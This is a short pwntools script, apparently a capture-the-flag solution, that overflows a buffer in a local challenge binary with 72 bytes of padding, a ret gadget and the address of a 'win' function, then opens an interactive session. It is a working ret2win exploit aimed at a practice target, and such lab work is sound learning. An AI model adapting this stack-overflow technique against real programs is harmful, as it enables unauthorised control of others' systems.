from pwn import *

elf = context.binary = ELF("./../public/chal")
p = process(elf.path)

rop = ROP(elf)

ret = rop.find_gadget(["ret"])[0]

win = elf.symbols["win"]

pl = b"a" * 72
# pl += p64(0x40101A)
# pl += p64(0x401190)
pl += p64(ret)
pl += p64(win)

p.sendline(pl)

p.interactive()
